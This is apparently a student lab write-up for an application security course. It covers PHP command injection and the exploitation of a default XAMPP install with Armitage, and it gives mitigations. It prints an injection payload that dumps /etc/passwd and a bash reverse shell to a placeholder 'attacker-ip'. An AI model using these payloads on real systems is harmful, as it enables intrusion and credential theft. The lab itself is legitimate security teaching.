# Module Five Labs: Command Injection & Full Application Exploitation
**CYB-240 | Application Security**

## Lab 1: Command Injection

**Objective:** Inject OS commands through a vulnerable PHP web application, establish a remote shell, and analyze the security implications of interpreted languages.

### Steps Performed
- Identified a command injection vulnerability in a PHP web application
- Injected malicious OS commands through an unsanitized input field
- Added custom HTML comment to modified source: `<!-- Livia Ward -->`
- Established a **remote shell** from the injected command — gaining interactive OS access from the browser

### How Command Injection Works
Command injection occurs when user input is passed unsanitized to a system shell command:

```php
// VULNERABLE — Never pass user input directly to shell commands
$output = shell_exec("ping " . $_GET['host']);

// Attacker input: "127.0.0.1; cat /etc/passwd"
// Executes: ping 127.0.0.1; cat /etc/passwd
// Result: ping runs, then /etc/passwd is dumped
```

The semicolon terminates the legitimate command and the attacker's command executes with the full privileges of the web server process.

### Remote Shell Establishment
Once command injection is confirmed, an attacker can inject a reverse shell payload:
```bash
# Example reverse shell via command injection:
bash -i >& /dev/tcp/attacker-ip/4444 0>&1
```
This gives the attacker an interactive terminal on the target server — accessible from anywhere.

### Interpreted vs. Compiled Languages — Security Risk

**Key question: What are the dangers of PHP (interpreted) vs. compiled languages?**

| Aspect | Interpreted (PHP) | Compiled (C, C++, Go) |
|---|---|---|
| **Source exposure** | Source code readable if misconfigured | Machine code — much harder to reverse |
| **Runtime attacks** | Code executes line-by-line; injection can execute at runtime | Compiled to binary before execution |
| **Speed** | Generally slower | Typically faster |
| **Error handling** | Runtime errors can expose stack traces and code paths | Compile-time errors caught before deployment |
| **Attack surface** | Larger — dynamic evaluation functions (`eval()`, `exec()`) easily abused | Smaller — no dynamic code execution by default |

**PHP-specific risks:**
- Functions like `eval()`, `exec()`, `shell_exec()`, `system()`, `passthru()` pass input directly to the OS or PHP interpreter — extremely dangerous with unsanitized input
- Source code exposure via misconfigured servers reveals application logic to attackers
- Dynamic typing can cause unexpected type coercion vulnerabilities

---

## Lab 2: Exploiting a Vulnerable Web Application (XAMPP / Armitage)

**Objective:** Use Armitage (Metasploit GUI) to exploit a vulnerable XAMPP installation, achieve post-exploitation access, and extract credential files.

### Steps Performed
- Launched **Armitage** and connected to Metasploit framework
- Identified and selected exploit targeting XAMPP vulnerability
- Executed exploit against target system
- Achieved successful compromise and post-exploitation shell
- Extracted credential file saved as: **Ward**
- Verified full system access via post-exploitation commands

### XAMPP Vulnerability Explained

**What is the vulnerability?**
XAMPP's default configuration leaves critical administrative interfaces **unsecured and unauthenticated** — specifically:
- **phpMyAdmin** accessible to anyone on the network without credentials
- **XAMPP Control Panel** with no access restrictions
- **Apache with directory listing enabled** — full file system visibility
- **Default MySQL root password is blank** — no password required for database admin access

**Why this is critical:**
An attacker with access to phpMyAdmin has complete control over all databases — they can read, modify, or delete any data, create backdoor accounts, and use MySQL's `INTO OUTFILE` to write web shells to the server. No exploitation of a software vulnerability is even required — the misconfiguration *is* the vulnerability.

**Mitigation:**
- Change all default credentials immediately after installation
- Restrict phpMyAdmin access by IP or remove it entirely from production servers
- XAMPP is a **development tool** — never deploy it to production without removing or securing all default components
- Disable directory listing in Apache configuration
- Set a strong MySQL root password

### Armitage — Offensive Tool for Defensive Understanding
Armitage provides a visual interface to Metasploit, making it easier to:
- Scan and discover attack surfaces across a network
- Select and launch exploits with visual feedback
- Manage multiple compromised systems (sessions) simultaneously
- Understand the full kill chain of an attack

Security analysts use Armitage in controlled environments to verify that defenses work — and to understand exactly what an attacker sees when they probe a target.

## Skills Demonstrated
`Command Injection` `Remote Shell` `Reverse Shell` `PHP Security` `Interpreted vs Compiled Languages` `eval() / exec() Risks` `XAMPP Security` `Default Credential Risk` `Armitage` `Metasploit` `Post-Exploitation` `phpMyAdmin Security` `Penetration Testing`
